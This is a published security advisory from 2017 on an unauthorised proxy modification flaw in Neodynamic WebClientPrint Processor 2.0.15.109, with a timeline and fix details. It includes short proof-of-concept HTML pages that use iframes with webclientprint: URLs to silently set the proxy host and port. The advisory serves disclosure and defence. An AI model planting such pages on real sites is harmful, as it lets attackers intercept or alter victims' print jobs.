@@ -1,0 +1,169 @@
+id: 28359
+date: 08/23/2017
+title: WebClientPrint Processor 2.0.15.109 Unauthorized Proxy Modification Vulnerability
+author: RedTeam
+cves: 
+
+Advisory: WebClientPrint Processor 2.0: Unauthorised Proxy Modification
+
+RedTeam Pentesting discovered that attackers can configure a proxy host
+and port to be used when fetching print jobs with WebClientPrint
+Processor (WCPP). This proxy setting may be distributed via specially
+crafted websites and is set without any user interaction as soon as the
+website is accessed.
+
+
+Details
+=======
+
+Product: Neodynamic WebClientPrint Processor
+Affected Versions: 2.0.15.109 (Microsoft Windows)
+Fixed Versions: >= 2.0.15.910
+Vulnerability Type: Man-in-the-Middle
+Security Risk: medium
+Vendor URL: http://www.neodynamic.com/
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-010
+Advisory Status: published
+CVE: GENERIC-MAP-NOMATCH
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH
+
+
+Introduction
+============
+
+Neodynamic's WebClientPrint Processor is a client-side application,
+which allows server-side applications to print documents on a client's
+printer without user interaction, bypassing the browser's print
+functionality. The server-side application may be written in ASP.NET or
+PHP while on the client-side multiple platforms and browsers are
+supported.
+
+"Send raw data, text and native commands to client printers without
+showing or displaying any print dialog box!" (Neodynamic's website)
+
+
+More Details
+============
+
+Upon installation under Microsoft Windows, WCPP registers itself as a
+handler for the "webclientprint" URL scheme. Thus, any URL starting with
+"webclientprint:" is handled by WCPP. For example, entering
+
+webclientprint:-about
+
+in the URL bar of a browser opens the about box of WCPP.
+
+During RedTeam Pentesting's analysis of WCPP it was determined that WCPP
+ignores the system proxy configuration and by default tries to fetch
+print jobs directly, bypassing a proxy potentially configured in the
+system. WCPP can however be configured to use a (possibly different)
+proxy through "webclientprint" URLs. For example, visiting the following
+URL will set 192.0.2.1 as a proxy IP for WCPP:
+
+webclientprint:-proxyHost:192.0.2.1
+
+Likewise, the port of the proxy can be changed to 14141 through this
+URL:
+
+webclientprint:-proxyPort:14141
+
+As soon as a proxy is initially configured, it will be used permanently
+without the need for any further confirmation. If a proxy was already
+configured before the URLs above are invoked, the old proxy will be
+replaced by the new one.
+
+
+Proof of Concept
+================
+
+An attacker may prepare a malicious website with the following content:
+
+------------------------------------------------------------------------
+<html>
+<body>
+<iframe src="webclientprint:-proxyHost:192.0.2.1">
+</iframe>
+</body>
+</html>
+------------------------------------------------------------------------
+
+When visited by a WCPP user, the proxy host will be rewritten without any
+user interaction and without any visual indication.
+
+Likewise, the following HTML code may be used to define another proxy
+port when visited:
+
+------------------------------------------------------------------------
+<html>
+<body>
+<iframe src="webclientprint:-proxyPort:14141">
+</iframe>
+</body>
+</html>
+------------------------------------------------------------------------
+
+This allows the proxy configuration to be changed without authorisation.
+
+
+Workaround
+==========
+
+Affected users should disable the WCPP handler and upgrade to a fixed
+version as soon as possible.
+
+
+Fix
+===
+
+Install a WCPP version greater or equal to 2.0.15.910[0].
+
+
+Security Risk
+=============
+
+If print jobs are fetched by WCPP over unencrypted HTTP, the
+unauthorised change of the proxy configuration may be exploited to yield
+a man-in-the-middle position. Attackers only need to trick users into
+visiting an attacker-controlled website which contains the configuration
+URLs as outlined above. Afterwards, all jobs printed via WCPP and
+fetched over HTTP will be requested through the proxy. This may lead to
+a disclosure of sensitive information depending on the printed
+documents. Furthermore, the integrity of the printed documents cannot be
+guaranteed anymore as attackers may also change the documents in
+transit.
+
+If print jobs are fetched by WCPP over encrypted HTTPS, the unauthorised
+change of the proxy configuration results in a denial of service. After
+establishing a connection to the proxy, neither an HTTP request nor a
+TLS ClientHello is sent. The exact cause was not investigated any
+further.
+
+Overall, this vulnerability is rated as a medium risk. This estimation
+may need to be adapted depending on the protocol that is used to fetch
+print jobs.
+
+
+Timeline
+========
+
+2015-08-24 Vulnerability identified
+2015-09-03 Customer approved disclosure to vendor
+2015-09-04 Asked vendor for security contact
+2015-09-04 CVE number requested
+2015-09-04 Vendor responded with security contact
+2015-09-07 Vendor notified
+2015-09-07 Vendor acknowledged receipt of advisory
+2015-09-15 Vendor released fixed version
+2015-09-16 Customer asked to wait with advisory release until all their
+           clients are updated
+2017-07-31 Customer approved advisory release
+2017-08-22 Advisory released
+
+
+References
+==========
+
+[0] https://neodynamic.wordpress.com/2015/09/15/webclientprint-2-0-for-windows-clients-critical-update/
+
+#  0day.today [2023-03-22]  #
